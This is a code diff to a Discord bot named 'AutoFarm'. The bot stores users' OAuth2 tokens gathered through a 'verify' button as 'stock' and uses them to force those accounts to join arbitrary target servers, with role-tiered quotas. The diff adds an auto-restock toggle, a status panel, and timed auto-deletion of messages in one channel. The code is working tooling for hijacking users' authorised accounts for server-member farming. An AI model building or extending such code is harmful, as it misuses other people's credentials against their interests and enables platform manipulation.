@@ -7,9 +7,10 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 8080;
 
-// Token Storage Database & Restock Counter
+// Token Storage Database & Configurations
 const tokenDatabase = []; 
 let restockCounter = 0; 
+let autoRestockEnabled = true; // Toggle for .autorestock command
 let currentPrefix = '.';
 let discordClient = null;
 
@@ -92,8 +93,8 @@ app.get('/', async (req, res) => {
                 }
             }
 
-            // 2. Check 30-person restock threshold alert
-            if (restockCounter >= 30) {
+            // 2. Check 30-person restock threshold alert (if enabled)
+            if (autoRestockEnabled && restockCounter >= 30) {
                 restockCounter = 0; 
 
                 if (discordClient) {
@@ -175,6 +176,19 @@ client.once('ready', () => {
 });
 
 client.on('messageCreate', async message => {
+    // --- Auto-Delete Messages Feature (Channel ID: 1561453220633518181) ---
+    if (message.channel.id === '1561453220633518181') {
+        setTimeout(async () => {
+            try {
+                if (message.deletable) {
+                    await message.delete();
+                }
+            } catch (err) {
+                // Ignore errors if message is already deleted
+            }
+        }, 7000); // Deletes after 7 seconds
+    }
+
     if (message.author.bot || !message.content.startsWith(currentPrefix)) return;
 
     const args = message.content.slice(currentPrefix.length).trim().split(/ +/);
@@ -189,11 +203,11 @@ client.on('messageCreate', async message => {
             .addFields(
                 { 
                     name: '⚙️ Core & Verification', 
-                    value: `\`${currentPrefix}verify\` - Generates the OAuth2 verification button\n\`${currentPrefix}stock\` - Views total active accounts in the database\n\`${currentPrefix}join <serverID>\` - Forces verified accounts to join a target server\n\`${currentPrefix}bot\` - Provides the bot invite button` 
+                    value: `\`${currentPrefix}verify\` - Generates the OAuth2 verification button\n\`${currentPrefix}stock\` - Views total active accounts in the database\n\`${currentPrefix}join <serverID>\` - Forces verified accounts to join a target server\n\`${currentPrefix}bot\` - Provides the bot invite button\n\`${currentPrefix}status\` - Displays bot operational status` 
                 },
                 { 
                     name: '🛠️ Config & Management', 
-                    value: `\`${currentPrefix}prefix set <prefix>\` - Changes the bot command prefix\n\`${currentPrefix}restock <n>\` - Manually adds restock count slots\n\`${currentPrefix}remove <n>\` - Removes accounts from the stock database\n\`${currentPrefix}channel set #channel\` - Sets notification channels` 
+                    value: `\`${currentPrefix}autorestock enable|disable\` - Toggles automatic restock alerts\n\`${currentPrefix}prefix set <prefix>\` - Changes command prefix\n\`${currentPrefix}restock <n>\` - Manually adds restock slots\n\`${currentPrefix}remove <n>\` - Removes accounts from stock` 
                 },
                 { 
                     name: '🛡️ Admin & Control', 
@@ -245,7 +259,46 @@ client.on('messageCreate', async message => {
         return message.reply(`📦 **Current Stock Pool:** \`${tokenDatabase.length}\` accounts available.`);
     }
 
-    // 5. .restock <n> Command
+    // 5. .status Command
+    if (command === 'status') {
+        const uptimeSeconds = Math.floor(client.uptime / 1000);
+        const hours = Math.floor(uptimeSeconds / 3600);
+        const minutes = Math.floor((uptimeSeconds % 3600) / 60);
+        const seconds = uptimeSeconds % 60;
+
+        const statusEmbed = new EmbedBuilder()
+            .setTitle('🟢 AutoFarm Bot Status')
+            .setColor(0x00FF00)
+            .addFields(
+                { name: '📊 Active Stock Pool', value: `\`${tokenDatabase.length}\` accounts`, inline: true },
+                { name: '🔄 Auto-Restock', value: autoRestockEnabled ? '`Enabled`' : '`Disabled`', inline: true },
+                { name: '🌐 Connected Servers', value: `\`${client.guilds.cache.size}\` servers`, inline: true },
+                { name: '⏱️ Uptime', value: `\`${hours}h ${minutes}m ${seconds}s\``, inline: true }
+            )
+            .setTimestamp();
+
+        return message.reply({ embeds: [statusEmbed] });
+    }
+
+    // 6. .autorestock <enable|disable> Command
+    if (command === 'autorestock') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+            return message.reply('❌ You need Administrator permissions to change autorestock settings.');
+        }
+
+        const action = args[0] ? args[0].toLowerCase() : '';
+        if (action === 'enable') {
+            autoRestockEnabled = true;
+            return message.reply('✅ Auto-restock announcements have been **enabled**.');
+        } else if (action === 'disable') {
+            autoRestockEnabled = false;
+            return message.reply('🛑 Auto-restock announcements have been **disabled**.');
+        } else {
+            return message.reply(`Usage: \`${currentPrefix}autorestock enable\` or \`${currentPrefix}autorestock disable\``);
+        }
+    }
+
+    // 7. .restock <n> Command
     if (command === 'restock') {
         const amount = parseInt(args[0]);
         if (isNaN(amount)) return message.reply(`Usage: \`${currentPrefix}restock <amount>\``);
@@ -253,14 +306,14 @@ client.on('messageCreate', async message => {
         return message.reply(`✅ Successfully restocked **${amount}** accounts manually. Total stock: \`${tokenDatabase.length}\`.`);
     }
 
-    // 6. .remove <n> Command
+    // 8. .remove <n> Command
     if (command === 'remove') {
         const amount = parseInt(args[0]) || 1;
         tokenDatabase.splice(0, amount);
         return message.reply(`🗑️ Removed **${amount}** accounts from stock. Current stock: \`${tokenDatabase.length}\`.`);
     }
 
-    // 7. .prefix set <prefix> Command
+    // 9. .prefix set <prefix> Command
     if (command === 'prefix' && args[0] === 'set') {
         if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
             return message.reply('❌ You need Administrator permissions to change the prefix.');
@@ -270,14 +323,13 @@ client.on('messageCreate', async message => {
         return message.reply(`✅ Bot prefix updated to: \`${currentPrefix}\``);
     }
 
-    // 8. .join <Server ID> Command (Tiered Role Limits & Out-of-Stock Embed)
+    // 10. .join <Server ID> Command (Tiered Role Limits & Out-of-Stock Embed)
     if (command === 'join') {
         const targetGuildId = args[0];
         if (!targetGuildId) {
             return message.reply(`Please provide a Server ID: \`${currentPrefix}join <server_id>\``);
         }
 
-        // Out of Stock Embed Check
         if (tokenDatabase.length === 0) {
             const noStockEmbed = new EmbedBuilder()
                 .setTitle('❌ Out of Stock')
@@ -286,7 +338,6 @@ client.on('messageCreate', async message => {
             return message.reply({ embeds: [noStockEmbed] });
         }
 
-        // Tiered Role Limits System
         const roleLimits = [
             { id: '1561435531462844587', limit: 1 },
             { id: '1561459311257850088', limit: 2 },
@@ -337,9 +388,9 @@ client.on('messageCreate', async message => {
         return message.channel.send(`AutoFarm successfully added **${successCount}** out of **${tokensToUse.length}** accounts to the server.`);
     }
 
-    // 9. Panel Commands Handlers
+    // 11. Panel Commands Handlers
     const panelCommands = [
-        'channel', 'checkauth', 'checkserver', 'status', 'panel',
+        'channel', 'checkauth', 'checkserver', 'panel',
         'basesend', 'send', 'verifyrole', 'cooldown', 'bio', 'color',
         'stats', 'profile', 'maintenance', 'banfarm', 'antiraid',
         'logfarm', 'logserver', 'logerrors', 'logadmin', 'logs', 'log',
